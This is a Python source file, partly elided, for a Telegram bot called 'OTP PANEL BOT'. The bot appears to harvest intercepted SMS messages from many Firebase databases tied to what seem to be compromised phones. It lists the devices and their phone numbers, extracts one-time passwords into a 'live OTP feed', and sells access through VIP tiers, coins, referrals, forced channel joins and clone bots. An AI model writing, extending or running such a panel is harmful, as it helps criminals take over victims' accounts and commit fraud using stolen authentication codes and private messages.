#!/usr/bin/env python3
"""
OTP PANEL BOT — SUPREME MASTER EDITION v4.0 (BULLETPROOF)
· No-delete policy · /activeurls download · Multi-channel force-join
· Strict VIP gate · Admin bypass · All commands 100% working
"""
...
# ✅ FIX #1 — both channels properly formed
REQUIRED_CHANNELS = [
    {
        "username": "earnflowspidy",
        "url": "https://t.me/earnflowspidy",
        "name": "Earn-Flow",
    },
    {
...
# ════════════════════════════════════════════════════════════
#  ✅ FIX #4 — BULLETPROOF VIP CHECK
# ════════════════════════════════════════════════════════════

def is_vip(bot_token: str, user_id: int) -> bool:
    """Return True only if user is admin OR has active VIP.

    FIXED:
    · Safe type-check on vip_until (handles None, str, int)
    · Missing user → not VIP
    · Missing vip_until → not VIP
    """
    # Admins on main bot always pass
    if bot_token == TOKEN and user_id in ADMIN_IDS:
        return True

    # Clone owner always passes on their own bot
    if bot_token != TOKEN:
        if user_id == CLONES.get(bot_token, {}).get("creator"):
            return True

    # Fetch correct user DB
    if bot_token == TOKEN:
        users_db = all_users
    else:
        users_db = CLONES.get(bot_token, {}).get("users", {})

    if user_id not in users_db:
        return False

    raw = users_db[user_id].get("vip_until", 0.0)

    # Coerce to float — silently treat invalid values as "no VIP"
    try:
...
def get_vip_time_left(bot_token: str, user_id: int) -> str:
    ...
    raw = users_db.get(user_id, {}).get("vip_until", 0.0)
    try:
        until = float(raw) if raw is not None else 0.0
    except (TypeError, ValueError):
        until = 0.0
...
async def get_http_session() -> aiohttp.ClientSession:
    ...
    if _http_session is None or _http_session.closed:
        ...
        _http_session = aiohttp.ClientSession(
            ...
            headers={"User-Agent": "OTPPanelBot/4.0"},
        )
...
# ════════════════════════════════════════════════════════════
#  ✅ FIX #2 & #3 — CHANNEL CHECK WITH ADMIN BYPASS
# ════════════════════════════════════════════════════════════

async def check_membership(bot_token, bot, user_id: int) -> list[str]:
    """Return channels the user has NOT joined.
    Admins are auto-exempt. Clone bots skip this check entirely.
    """
    # ✅ FIX #3 — Admins skip force-join completely
    if user_id in ADMIN_IDS:
        return []

    # Only main bot enforces force-join
    if bot_token != TOKEN:
        return []
    ...
    for ch in REQUIRED_CHANNELS:
        try:
            ...
            # Fail-open: don't lock users out if bot isn't admin in channel
...
def build_join_text() -> str:
    text = (
        ...
        "━━━━━━━━━━━━━━━━━━\n"
        "Bot use karne ke liye neeche diye gaye <b>sabhi channels</b> "
        "join karna zaroori hai:\n\n"
    )
    for ch in REQUIRED_CHANNELS:
        text += f"• <b>{ch['name']}</b>\n  {ch['url']}\n"
    text += "\n✅ Sabhi channels join karne ke baad <b>'Check Now'</b> button dabayein."
    return text


# ✅ FIX #2 — Accepts Update OR Message OR Bot+chat_id
async def send_join_prompt(source, is_main_bot: bool = True) -> None:
    text = build_join_text()
...
async def send_join_prompt_to_bot(bot, chat_id: int) -> None:
    try:
        ...
        tlog(f"Join prompt send to bot failed: {e}")
...
async def bulk_add_databases(urls: list[str], user_id: int = 0,
    ...
    results = await asyncio.gather(*(fetch_one(n, u) for n, u in planned),
...
def collect_active_urls() -> list[dict]:
    ...
    for name, url in DATABASES.items():
        ...
        rows.append({
            "name": name, "url": url, "source": "public",
            "devices": len(devs), "online": online,
        })
    ...
    for uid, lst in PRIVATE_DBS.items():
        for pdb in lst:
            ...
            online = sum(1 for d in devs if d.status == "online")
            rows.append({
                "name": pdb.get("name", "Private"), "url": url,
                "source": "private", "devices": len(devs), "online": online,
            })
    ...
    for token, data in CLONES.items():
        ...
        online = sum(1 for d in devs if d.status == "online")
        rows.append({
            "name": f"clone:{data.get('username','?')}", "url": cdb,
            "source": "clone", "devices": len(devs), "online": online,
        })
...
def get_vip_denied_keyboard(chat_id: int) -> InlineKeyboardMarkup:
    ...
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"👑 Buy VIP ({VIP_PRICE_COINS} Coins = {VIP_DURATION_HOURS} Hours)",
            callback_data="buy_vip")],
        [InlineKeyboardButton(
            "💸 Share Referral Link & Earn Coins",
...
def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    ...
    if bot_token != TOKEN:
        keys.append([InlineKeyboardButton("🔗 Add Custom Firebase URL",
                                          callback_data="add_custom_db")])
...
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
        ...
        if expired:
            try:
                await update.message.reply_text(
                    "Aapka premium khatam ho gaya, isliye aapka bot off kiya humne.")
    ...
    if chat_id not in users_db:
        ...
        # Referral bonus (only if referrer exists and is different)
        if is_main_bot and ref_id and ref_id in users_db and ref_id != chat_id:
            ...
            try:
                await ctx.bot.send_message(
                    ref_id, "🎉 You have a new referral! +10 Coins added.")
            except Exception:
                pass

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    # ✅ FIX: Force-join ONLY for non-admins on main bot
    if is_main_bot and not is_admin:
        ...
        if not_joined:
            ...
            return
        users_db[chat_id]["verified"] = True
...
async def cmd_recent(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    # ✅ FIX #5 — No double force-join; admin bypass; only one check
    if is_main_bot and not is_admin:
        not_joined = await check_membership(bot_token, ctx.bot, chat_id)
        if not_joined:
            await send_join_prompt(update, is_main_bot)
    ...
    if not is_vip(bot_token, chat_id):
        try:
            await update.message.reply_text(
                vip_lock_text(is_main_bot), parse_mode="HTML",
    ...
    wait_msg = await update.message.reply_text(
        "⏳ <b>Scanning live OTP feed…</b>", parse_mode="HTML")
    ...
    results = await asyncio.gather(*(scan_one(d) for d in scan_devs),
                                   return_exceptions=True)
    found = []
    for res in results:
    ...
    btn_rows, row = [], []
    for item in feed:
        row.append(InlineKeyboardButton(f"📋 {item['otp']}",
                                        callback_data=f"cp:{item['otp']}"))
        if len(row) == 2:
            btn_rows.append(row)
            row = []
    if row:
...
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        await update.message.reply_text(
            admin_panel_text(bot_token), parse_mode="HTML",
...
async def _status_payload(bot_token: str) -> str:
    ...
    online = sum(1 for d in devices if d.status == "online")
    db_counts = {tag: sum(1 for d in devices if d.db_tag == tag)
                 for tag in set(d.db_tag for d in devices)}
    db_lines = "\n".join([f"🗄 DB {tag}: {count} devices"
                          for tag, count in list(db_counts.items())[:20]])
    active_urls = len(collect_active_urls())
    return (f"📊 <b>BOT STATUS</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🤖 Bot Engine: Running ✅\n{db_lines}\n\n"
...
def _leaderboard_text(users_db: dict) -> str:
    sorted_users = sorted(users_db.items(),
                          key=lambda x: x[1].get("otp_count", 0),
                          reverse=True)
    medals = ["🥇", "🥈", "🥉"] + ["🔸"] * 7
...
async def cmd_support(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user_focus.setdefault(ctx.bot.token, {}).pop(chat_id, None)
    buttons = [[InlineKeyboardButton(f"📢 {ch['name']}", url=ch["url"])]
               for ch in REQUIRED_CHANNELS]
...
async def on_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    # ✅ FIX — Admins bypass force-join entirely.
    # Non-admins: only check if the command is NOT /cancel.
    if is_main_bot and not is_admin:
        if text.lower() not in ("/cancel",):
            not_joined = await check_membership(bot_token, ctx.bot, chat_id)
            if not_joined:
                users_db.setdefault(chat_id, {})["verified"] = False
                await send_join_prompt(update, is_main_bot)
                return
            users_db.setdefault(chat_id, {})["verified"] = True
    # Only admins proceed to admin commands
    if not is_admin:
        return
    ...
    try:
        ...
        try:
            ...
            pass
# ════════════════════════════════════════════════════════════
#  CALLBACK QUERY DISPATCHER — ✅ FULLY FIXED
# ════════════════════════════════════════════════════════════

# Callbacks that BYPASS force-join completely
_FORCE_JOIN_EXEMPT_CALLBACKS = {
    "noop",
    "close_msg",
    "check_join",
    "cmd_status",
    "priv_refresh",
    "priv_add",
    "priv_open",  # handled via startswith
    "recent_refresh",
    "activeurls_download",
    "activeurls_refresh",
    "admin_refresh",
    ...
    "admin_broadcast",
    "admin_gift_coins",
    "admin_setchannel",  # placeholder for future
    "add_custom_db",
    "buy_vip",  # VIP purchase should work even without force-join check (rare)
}

# Prefixes that should bypass force-join (admin-only callbacks)
_FORCE_JOIN_EXEMPT_PREFIXES = (
    "admin_",
    "priv_",
    "pg:",     # pagination — user already went through home
    "cp:",     # copy OTP — user already connected
)


def _should_skip_force_join(data: str) -> bool:
    """Return True if this callback should bypass force-join check."""
    if data in _FORCE_JOIN_EXEMPT_CALLBACKS:
        return True
    for prefix in _FORCE_JOIN_EXEMPT_PREFIXES:
...
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    # ── ✅ FIXED FORCE-JOIN GATE ───────────────────────────
    # Skip force-join for:
    #   · Admins
    #   · Clone bots (not main)
    #   · Exempt callbacks (check_join, close_msg, admin_*, etc.)
    if (is_main_bot
            and not is_admin
            and not _should_skip_force_join(data)):
        not_joined = await check_membership(bot_token, ctx.bot, chat_id)
        if not_joined:
            users_db.setdefault(chat_id, {})["verified"] = False
            await safe_answer(
                ...
                "Pehle saare channels join karein, phir koi bhi button dabayein.",
                show_alert=True
            )
            # Send fresh join prompt via the bot directly (no Update needed)
            try:
                if query.message:
                    await query.message.delete()
            except Exception:
                pass
            await send_join_prompt_to_bot(ctx.bot, chat_id)
            return
        users_db.setdefault(chat_id, {})["verified"] = True

    # ── Dispatch with per-user lock ────────────────────────
    await user_guards.acquire(chat_id)
    try:
        await _dispatch_callback(
            query, ctx, data, chat_id, bot_token,
            users_db, is_admin, is_main_bot
        )
...
async def _dispatch_callback(query, ctx, data: str, chat_id: int, bot_token: str,
        ...
        if is_main_bot:
            ...
            if not_joined:
                ...
                await safe_answer(
                    ...
                    f"Pehle saare channels join karein, phir 'Check Now' dabayein.",
                    show_alert=True
                )
                return
        users_db.setdefault(chat_id, {})["verified"] = True
    ...
    if data == "cmd_status":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await safe_edit(query, await _status_payload(bot_token),
                        reply_markup=_status_keyboard())
        return
    ...
    if data == "recent_refresh":
        ...
        await safe_edit(
            query,
            "🔑 Use <code>/recent</code> again to refresh the live OTP feed.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
        return
    ...
    if data == "buy_vip":
        if not is_main_bot:
            await safe_answer(query, "VIP purchase only available on main bot.",
                              show_alert=True)
            return
        ...
        try:
            current_vip = float(current_vip) if current_vip else 0.0
        except (TypeError, ValueError):
            current_vip = 0.0
    ...
    if data == "priv_add":
        ...
        await safe_edit(
            ...
            "❌ Cancel: /cancel",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data="priv_refresh")]]))
        return
    ...
    if data.startswith("priv_open:"):
        ...
        if not (0 <= idx < len(dbs)):
            await safe_answer(query, "DB not found.", show_alert=True)
            return
        pdb = dbs[idx]
        devs = PRIVATE_DEVICE_CACHE.get(pdb["url"], [])
        if not devs:
        ...
        for d in devs[:20]:
            icon = "🟢" if d.status == "online" else "🔴"
            lbl = (f"{icon} 📱 {' & '.join(d.numbers)}"
                   if d.numbers else f"{icon} ⚙️ {d.name} ({d.id[:6]})")
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
        if not rows:
    ...
    if data == "admin_refresh" and is_admin:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await safe_edit(query, admin_panel_text(bot_token),
                        reply_markup=admin_keyboard(bot_token))
        return
    ...
    if data == "admin_add_firebase" and is_admin and is_main_bot:
        ...
        await safe_edit(
            ...
            "━━━━━━━━━━━━━━━━━━\n"
            "Ek ya zyada Firebase URLs bhejein — har URL ek naye line par "
            "(ya comma/space se alag).\n\n"
    ...
    if data == "admin_users" and is_admin:
        ...
        for i, (uid, info) in enumerate(list(users_db.items())[:50], 1):
            ...
            lines.append(
                f"{i}. {icon} {user_display(info)}\n"
                f"   ID: <code>{uid}</code> | OTPs: {info.get('otp_count', 0)}")
        text = "\n".join(lines)
        if len(text) > 4000:
            text = text[:4000] + "\n\n...[more users]"
    ...
    if data == "admin_gift_coins" and is_admin:
        ...
        await safe_edit(
            ...
            "━━━━━━━━━━━━━━━━━━\n"
            "Kitne coins sabko send karne hain? Number type karein "
            "(Jaise: 50, 100):\n\n"
            "❌ Cancel: /cancel",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
        ...
        if not devices:
            await safe_edit(
                ...
                reply_markup=InlineKeyboardMarkup([
                    ...
                    [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            return
        await safe_edit(query, device_list_header(devices, 0),
                        reply_markup=device_list_keyboard(devices, 0))
        return
    ...
    if data.startswith("pg:"):
        ...
        try:
            ...
            page = 0
        devices = await get_all_devices(bot_token, chat_id)
        await safe_edit(query, device_list_header(devices, page),
                        reply_markup=device_list_keyboard(devices, page))
        return
    ...
    # ── Device selection / messages / info ────────────────
    devices = await get_all_devices(bot_token, chat_id)
    ...
    if data.startswith("msgs:"):
        ...
        for sms in smss:
            ...
            if otp:
                has_otp = True
                otp_buttons.append([
                    InlineKeyboardButton(f"📋 Copy OTP: {otp}",
        ...
        otp_buttons.append([InlineKeyboardButton("🔙 Back to Device",
                                                  callback_data=f"sel:{dev_id}")])
...
async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
    ...
    if cmd == "/all":
        ...
        wait = await update.message.reply_text(
            f"⏳ {len(users_db)} users ko {amount} coins bheje ja rahe hain...")
            ...
            try:
                async with _send_sem:
                    await send_bot.send_message(
                        ...
                        f"Aapko <b>{amount} Coins</b> mil gaye hain!\n"
                        f"Naya balance: <b>{users_db[uid]['coins']}</b>",
                        parse_mode="HTML")
                return True
            except Exception:
                return False
    ...
    if cmd == "/take":
        ...
        await reply(f"✅ <code>{uid}</code>: {old} → {users_db[uid]['coins']}",
                    parse_mode="HTML")
        return True
    ...
    if cmd == "/vip":
        ...
        try:
            await send_bot.send_message(
                uid,
                f"👑 <b>VIP GRANTED!</b>\n\n"
                f"Admin ne aapko <b>{hours}h VIP</b> diya hai!",
                parse_mode="HTML")
        except Exception:
            pass
    ...
    if cmd == "/vipall":
        ...
        results = await asyncio.gather(*(give_vip(u) for u in list(users_db.keys())),
                                       return_exceptions=True)
        sent = sum(1 for r in results if r is True)
    ...
    if cmd == "/userinfo":
        ...
        await reply(
            ...
            f"📅 {info.get('joined_at','N/A')}\n"
            f"💰 Coins: {info.get('coins',0)}\n"
            f"👥 Referrals: {info.get('referrals',0)}\n"
            f"📩 OTPs: {info.get('otp_count',0)}\n"
            f"🤖 Bots: {info.get('bots_created',0)}\n"
            f"👑 VIP: {vip_status}\n"
            f"🔐 {'✅' if info.get('verified') else '⏳'}, "
            f"{'🚫' if info.get('banned') else '✅ Active'}",
            parse_mode="HTML")
        return True
    ...
    if cmd == "/stats":
        ...
        vip_users = sum(1 for u in users_db.values() if is_vip(bot_token, list(users_db.keys())[0]) is False and False)
        # Count VIP users properly
        vip_users = 0
        for u_id, u_data in users_db.items():
            raw = u_data.get("vip_until", 0.0)
            try:
                until = float(raw) if raw else 0.0
            except (TypeError, ValueError):
                until = 0.0
    ...
    if cmd == "/broadcast":
        ...
        results = await asyncio.gather(*(send_one(c) for c in targets),
                                       return_exceptions=True)
        sent = sum(1 for r in results if r is True)
    ...
    if cmd == "/adddb":
        ...
        if len(urls) > 1:
            wait = await update.message.reply_text(
                f"⏳ Adding {len(urls)} databases (auto-naming)...")
        ...
        if len(args) < 2:
            await reply(
                "⚠️ Usage: <code>/adddb Name https://...</code>\n"
    ...
    if cmd == "/count":
        ...
        online = sum(1 for devs in GLOBAL_DEVICE_CACHE.values()
                     for d in devs if d.status == "online")
        with_num = sum(1 for devs in GLOBAL_DEVICE_CACHE.values()
                       for d in devs if d.numbers)
        await reply(
            f"📱 <b>DEVICES</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🗄 DBs: {len(DATABASES)}\n"
        ...
        try:
            with open(FIREBASE_LOG_FILE, "rb") as f:
                await update.message.reply_document(
                    ...
                    caption=(
                        f"📄 <b>firebase.txt</b> — every uploaded Firebase URL\n"
                        f"🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}"
                    ),
                    parse_mode="HTML")
        except Exception as e:
    ...
    # Command intentionally absent. Attempts fall through
    # to "Unknown command" in on_command.

    return False
# ════════════════════════════════════════════════════════════
#  DOCUMENT HANDLER (.txt uploads)
# ════════════════════════════════════════════════════════════
...
async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if not fname.endswith(".txt"):
        try:
            await update.message.reply_text(
                "⚠️ Sirf <b>.txt</b> file upload karein (har line par ek URL).",
                parse_mode="HTML")
        except TelegramError:
            pass
        return
    ...
    if not urls:
        try:
            await wait.edit_text(
                ...
                "Har line par ek URL hona chahiye.",
                parse_mode="HTML")
        except TelegramError:
            pass
        return
    ...
    if action == "add_private_db":
        ...
        try:
            await wait.edit_text(
                ...
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔐 Open Private OTP",
                                          callback_data="priv_refresh")]]))
        except TelegramError:
            pass
        return
    ...
    if action == "add_custom_db":
        ...
        try:
            await wait.edit_text(
                ...
                + (f"\n\nℹ️ {len(urls) - 1} extra URLs ignored "
                   f"(custom DB sirf ek hota hai)." if len(urls) > 1 else ""),
                parse_mode="HTML")
        except TelegramError:
            pass
        return
    ...
    try:
        await wait.edit_text(
            f"⏳ Importing {len(urls)} database(s) — auto-naming & scanning devices…")
    except TelegramError:
        pass
...
# ════════════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER — ✅ FIXED FORCE-JOIN GATE
# ════════════════════════════════════════════════════════════

# Commands / messages that BYPASS force-join in on_text
_TEXT_BYPASS = {
    "/cancel", "cancel",
    "/start", "/help", "/admin", "/status", "/stats",
    "/activeurls", "/points", "/referral", "/support",
    "/leaderboard", "/recent",
}

# Menu button texts that REQUIRE force-join
_MENU_BUTTONS = {
    "📱 Devices List", "🔍 Search Number",
    "🔐 Private OTP", "💸 Refer & Earn",
    "🤖 Create Your Bot",  # starts-with
}
...
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    #   · Admins
    #   · Non-main bots
    #   · /cancel and other bypass commands
    #   · pending-action replies (user is mid-flow)
    # Force-join only when user taps a MENU BUTTON
    is_menu_action = (
        text in _MENU_BUTTONS
        or text.startswith("🤖 Create Your Bot")
    )
    is_bypass = (
        text.lower() in _TEXT_BYPASS
        or text.lower().startswith("/")
        or (chat_id in pending_action)  # mid-flow reply
    )

    if is_main_bot and not is_admin and is_menu_action and not is_bypass:
        not_joined = await check_membership(bot_token, ctx.bot, chat_id)
        if not_joined:
            users_db.setdefault(chat_id, {})["verified"] = False
            await send_join_prompt(update, is_main_bot)
    ...
    if text == "📱 Devices List":
        ...
        # ✅ FIX: VIP gate — no force-join loop, only VIP check
        if not is_vip(bot_token, chat_id):
            try:
                await update.message.reply_text(
                    vip_lock_text(is_main_bot), parse_mode="HTML",
        ...
        if not devices:
            try:
                await update.message.reply_text(
                    "📭 <b>No Devices Found</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "Abhi koi device linked nahi hai. "
    ...
    if action == "add_private_db":
        ...
        if not urls:
            ...
            return
        wait = await update.message.reply_text(
            f"⏳ Adding {len(urls)} private DB(s)…")
        ...
        for u in urls:
            ...
            if ok:
                ...
                lines.append(f"❌ {name}  ({u[:45]}…)")
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append(f"📊 Your private DBs: "
                     f"<b>{len(PRIVATE_DBS.get(chat_id, []))}</b>  ♾️")
        try:
            await wait.edit_text(
                "\n".join(lines), parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
    ...
    if action == "add_firebase_main" and is_admin and is_main_bot:
        ...
        if not urls:
            ...
            return
        wait = await update.message.reply_text(
            f"⏳ Adding <b>{len(urls)}</b> database(s) — "
            f"auto-naming & scanning devices…",
            parse_mode="HTML")
        added, failed = await bulk_add_databases(urls, user_id=chat_id)
        ...
        async def send_gift(uid):
            ...
            try:
                async with _send_sem:
                    await send_bot.send_message(
                        uid,
                        f"🎁 <b>GIFT!</b> +<b>{coins_to_give} Coins</b>",
                        parse_mode="HTML")
                return True
            except Exception:
                return False
    ...
    # ─── Unknown text with pending action ──────────────────
    # Ignore silently — don't spam user
    return
# ════════════════════════════════════════════════════════════
...
async def _poll_sms_bulk(devices_in_db: list, url: str) -> int:
    ...
    # Type-4 devices (receivedSms path)
    ...
    if type4_devs:
        ...
        results = await asyncio.gather(
            *(fetch_t4_sms(d) for d in type4_devs),
            return_exceptions=True)
...
async def poll_loop(app: Application) -> None:
    ...
    while True:
        try:
            ...
            if first_run:
                # Seed seen_ids so we don't forward old messages
                for tag, url in dbs_to_poll.items():
                    r_main, r_user, r_root = await asyncio.gather(
                        fb_get("All_Users/sms", url),
                        fb_get("user_sms", url),
...
async def start_web_server():
    ...
    web_app.add_routes([
        web.get('/', _web_handle_root),
        web.get('/healthcheck', _web_handle_health),
    ])
    ...
    await site.start()
    tlog(f"🌐 Web server started on port {port}")
...
def main() -> None:
    ...
    print("═" * 60)
    print("  🤖 OTP PANEL BOT — SUPREME MASTER EDITION v4.0")
    print("  🔒 No-delete policy · 🌐 /activeurls download")
    print("  🚪 Multi-channel force-join · Admin bypass")
    print("  🌐 Dummy Web Server for Render")
    print("═" * 60)
